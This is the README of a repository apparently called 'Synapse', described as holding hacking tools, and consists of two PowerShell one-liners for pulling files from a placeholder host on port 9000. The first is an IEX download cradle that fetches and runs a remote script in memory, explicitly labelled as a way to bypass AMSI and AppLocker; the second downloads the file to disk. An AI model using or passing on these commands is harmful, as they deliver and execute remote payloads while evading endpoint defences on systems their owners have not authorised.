# Synapse
## Repo for hacking tools

# Get files
## IEX (Doesnt touch disk - Helps to bypass AMSI/Applocker)
`IEX (New-Object Net.WebClient).DownloadString('http://xxxxx:9000/somefile')`

## Write to disk
`invoke-webrequest -Uri http://xxxxx:9000/somefile -OutFile somefile`
